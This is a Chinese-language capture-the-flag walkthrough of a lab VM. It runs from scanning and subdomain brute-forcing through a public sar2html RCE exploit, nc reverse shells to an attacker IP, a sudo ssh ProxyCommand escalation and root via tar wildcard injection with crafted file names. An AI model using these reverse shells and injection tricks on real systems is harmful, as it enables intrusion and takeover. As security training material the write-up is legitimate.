## 复盘*

## 靶机地址

[Proton Drive](https://drive.proton.me/urls/RRFEQYQFK8#YHISmO3LAsZr)

![image-20250324183227133](assets/image-20250324183227133.png)



## 信息收集

### nmap扫描

#### 准备阶段

```
mkdir nmapscan
```

![image-20250324183250208](assets/image-20250324183250208.png)

创建文件夹用来存放nmap扫描结果



#### 主机探测

```
nmap -sn 192.168.1.0/24
```

![image-20250324183327637](assets/image-20250324183327637.png)

确定靶机ip：

192.168.1.6



#### 端口扫描

```
nmap -sT --min-rate 10000 -p- 192.168.1.6 -oA ./nmapscan/ports
```

![image-20250324183409923](assets/image-20250324183409923.png)

开放了：

- 22 ssh
- 80 http



#### 提取端口信息

```
ports
```

![image-20250324183452721](assets/image-20250324183452721.png)



#### 详细结果扫描

```
nmap -sT -sC -sV -O -p 22,80 192.168.1.6 -oA ./nmapscan/detail
```

![image-20250324183532037](assets/image-20250324183532037.png)

分析：

- 22 ssh OpenSSH 8.4p1
- 80 http Apache httpd 2.4.56
- Deian



#### UDP扫描

```
nmap -sU --top-ports 20 192.168.1.6 -oA nmapscan/udp
```

![image-20250324183634258](assets/image-20250324183634258.png)



### 80 端口

#### 访问192.168.1.6

![image-20250324183725970](assets/image-20250324183725970.png)

apache主页

查看源码无信息



#### dirsearch扫描目录

```
dirsearch -u http://192.168.1.6
```

![image-20250324183749010](assets/image-20250324183749010.png)

无内容



#### gobuster扫描目录

```
gobuster dir -u http://192.168.1.6 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![image-20250324183912977](assets/image-20250324183912977.png)

无内容





#### bp抓包查看

![image-20250324184009499](assets/image-20250324184009499.png)

存在dns解析



#### 添加本地host解析

```
windows：C:\Windows\System32\drivers\etc
```

![image-20250324184103238](assets/image-20250324184103238.png)

```
kali：/etc/hosts
```

![image-20250324184641749](assets/image-20250324184641749.png)



#### 访问pl0t.nyx

![image-20250324184936935](assets/image-20250324184936935.png)





#### 利用gobuster进行子域名爆破

```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u pl0t.nyx
--append-domain
```

![image-20250324184529282](assets/image-20250324184529282.png)

得到：

- sar.pl0t.nyx



#### 继续添加本地host解析

![image-20250324184708176](assets/image-20250324184708176.png)



#### 访问http://sar.pl0t.nyx

![image-20250324184951055](assets/image-20250324184951055.png)

sar2html 3.2.1



#### 搜索相关漏洞

```
searchsploit sar2html
```

![image-20250324185020504](assets/image-20250324185020504.png)



#### 保存脚本

![image-20250324185117238](assets/image-20250324185117238.png)



#### 执行

```
python 49344.py
http://sar.pl0t.nyx/
ls
```

![image-20250324185148204](assets/image-20250324185148204.png)



#### 执行反弹shell命令

##### 本地开启监听

```
nc -lvp 283
```

![image-20250324185221806](assets/image-20250324185221806.png)

##### 执行弹shell命令

```
nc -e /bin/bash 192.168.1.3 283
```

![image-20250324185247021](assets/image-20250324185247021.png)

![image-20250324185308068](assets/image-20250324185308068.png)

成功



## 提权

### python转换终端

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20250324185334897](assets/image-20250324185334897.png)

失败



### script转换终端

```
/usr/bin/script -qc /bin/bash /dev/null
```

![image-20250324185403083](assets/image-20250324185403083.png)



### 查看用户信息

```
cat /etc/passwd
```

![image-20250324185427742](assets/image-20250324185427742.png)

存在普通用户tony



### 进入tony的家目录

```
cd home
ls
cd tony
```

![image-20250324185523044](assets/image-20250324185523044.png)

![image-20250324185537542](assets/image-20250324185537542.png)

失败



### 执行sudo -l

```
sudo -l
```

![image-20250324185551552](assets/image-20250324185551552.png)

无密码以tony身份执行ssh



### ssh提权

```
sudo -u tony ssh -o ProxyCommand=';sh 0<&2 1>&2' x
whoami
```

![image-20250324185637602](assets/image-20250324185637602.png)



### script转换终端

```
/usr/bin/script -qc /bin/bash /dev/null
```

![image-20250324185701799](assets/image-20250324185701799.png)



### 得到第一个flag

![image-20250324185751023](assets/image-20250324185751023.png)



### suid位查找

```
find / -perm -4000 2>/dev/null
```

![image-20250324185831185](assets/image-20250324185831185.png)

无关键信息





### 上传linpeas.sh

```
wget 192.168.1.3/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![image-20250324185925105](assets/image-20250324185925105.png)

无关键内容



### 查看进程信息

上传pspy64

```
wget 192.168.1.3/pspy64
chmod +x pspy64
./pspy64
```

![image-20250324190042258](assets/image-20250324190042258.png)

![image-20250324190200433](assets/image-20250324190200433.png)

可以看到root用户在/var/www/html路径下执行tar命令

且压缩的文件用的是通配符

则我们可以在/var/www/html路径下放置恶意文件

利用通配符处理来得到root权限



### 进入/var/www/html

```
cd /var/www/html
touch 1
ls
```

![image-20250324190702868](assets/image-20250324190702868.png)

可以看到我们对/var/www/html文件夹可读写



### 构造恶意文件

```
touch -- '--checkpoint=1'
echo 'nc -e /bin/bash 192.168.1.3 289'>nc.sh
touch -- '--checkpoint-action=exec=sh nc.sh'
```

![image-20250324191124223](assets/image-20250324191124223.png)

![image-20250324191317798](assets/image-20250324191317798.png)

![image-20250324191136861](assets/image-20250324191136861.png)



### 本地开启监听

![image-20250324191334196](assets/image-20250324191334196.png)



### 得到任务执行后

![image-20250324191329627](assets/image-20250324191329627.png)

成功提权



### 得到第二个flag

```
cd /root
ls
cat root.txt
```

![image-20250324191419302](assets/image-20250324191419302.png)